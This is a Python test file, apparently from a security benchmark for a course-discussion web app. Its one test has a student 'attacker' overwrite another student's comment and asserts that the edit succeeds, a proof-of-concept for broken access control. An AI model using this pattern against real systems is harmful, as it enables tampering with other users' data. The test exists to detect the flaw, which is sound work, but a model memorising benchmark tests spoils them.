from helpers import ApiClient


def build_course_with_members(admin: ApiClient, course_title: str, memberships: list[tuple[int, str]]):
    course = admin.create_course(course_title)
    for user_id, role in memberships:
        admin.add_member(course["course_id"], user_id, role)
    return course


def test_exploit_any_course_member_can_edit_another_users_comment(app_instance):
    admin = ApiClient.new(app_instance["base_url"])
    admin.login("admin", "admin123")

    author = ApiClient.new(app_instance["base_url"])
    author_user = author.register("comment_author", "pass123", "Comment Author")
    attacker = ApiClient.new(app_instance["base_url"])
    attacker_user = attacker.register("comment_attacker", "pass123", "Comment Attacker")

    course = build_course_with_members(
        admin,
        "Comment Course",
        [(author_user["user_id"], "student"), (attacker_user["user_id"], "student")],
    )

    author.login("comment_author", "pass123")
    post = author.create_post(course["course_id"], "discussion", "post body")
    comment = author.create_comment(course["course_id"], post["post_id"], "author comment")

    attacker.login("comment_attacker", "pass123")
    resp = attacker.update_comment(course["course_id"], post["post_id"], comment["comment_id"], "tampered comment")
    assert resp.status_code == 200, resp.text

    comments = author.list_comments(course["course_id"], post["post_id"])
    changed = next(c for c in comments if int(c["comment_id"]) == int(comment["comment_id"]))
    assert changed["body"] == "tampered comment"